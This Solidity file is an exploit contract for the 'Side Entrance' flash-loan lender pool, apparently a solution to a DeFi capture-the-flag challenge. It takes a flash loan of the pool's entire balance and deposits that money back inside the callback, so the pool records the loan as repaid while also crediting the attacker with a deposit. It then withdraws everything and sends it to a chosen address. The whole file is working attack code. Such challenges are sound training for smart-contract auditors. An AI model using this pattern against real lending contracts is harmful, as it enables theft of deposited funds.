// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
  
}

contract Attacker {

    function attack(address poolAddress) external {
        // The attacker can implement the logic to exploit the SideEntranceLenderPool here.
        // This function should be called to initiate the attack.
        
        // call SideEntranceLenderPool flashLoan
        ISideEntranceLenderPool(poolAddress).flashLoan(poolAddress.balance);
    }

    function execute() external payable {
        // The attacker can implement the logic to exploit the SideEntranceLenderPool here.
        // This function will be called by the SideEntranceLenderPool during the flash loan process.
        
        // call SideEntranceLenderPool deposite
        ISideEntranceLenderPool(msg.sender).deposit{value: msg.value}();
    }

    function withdraw(address to, address poolAddress) external {
        // The attacker can withdraw the funds from the SideEntranceLenderPool.
        // This function should be called after the exploit is executed.
        
        ISideEntranceLenderPool(poolAddress).withdraw();
        
        // Transfer the withdrawn funds to the specified address
        payable(to).transfer(address(this).balance);
    }

    receive() external payable {
        // This function allows the contract to receive Ether.
        // It is necessary for the contract to be able to execute the exploit.
    }
}